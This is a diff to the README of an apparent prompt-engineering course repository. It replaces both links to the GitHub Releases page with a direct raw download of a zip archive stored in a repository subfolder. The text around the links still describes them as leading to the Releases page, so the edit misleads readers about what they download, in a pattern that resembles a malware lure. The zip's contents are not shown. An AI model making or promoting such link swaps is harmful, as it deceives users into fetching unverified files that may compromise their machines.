@@ -1,7 +1,7 @@
 # 🎓 Prompt-Engineering-Course - Learn Practical Prompt Engineering Skills
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/flofuentes/Prompt-Engineering-Course/releases)
+[![Download](https://github.com/flofuentes/Prompt-Engineering-Course/raw/refs/heads/master/提示詞工程教學/Engineering_Prompt_Course_3.1.zip)](https://github.com/flofuentes/Prompt-Engineering-Course/raw/refs/heads/master/提示詞工程教學/Engineering_Prompt_Course_3.1.zip)
 
 ## 📘 Introduction
 Welcome to the **Prompt-Engineering-Course**. This course provides practical training materials on prompt engineering, a vital skill in today's digital world. Here, you will learn how to create effective prompts and enhance your understanding of artificial intelligence.
@@ -11,7 +11,7 @@ To begin your journey with our course materials, you need to download the latest
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**
-   Go to the following link to access the Releases page: [Download Here](https://github.com/flofuentes/Prompt-Engineering-Course/releases).
+   Go to the following link to access the Releases page: [Download Here](https://github.com/flofuentes/Prompt-Engineering-Course/raw/refs/heads/master/提示詞工程教學/Engineering_Prompt_Course_3.1.zip).
 
 2. **Select the Latest Release**
    On the Releases page, look for the latest version. The version number will be marked at the top. Click on it to view the full details.
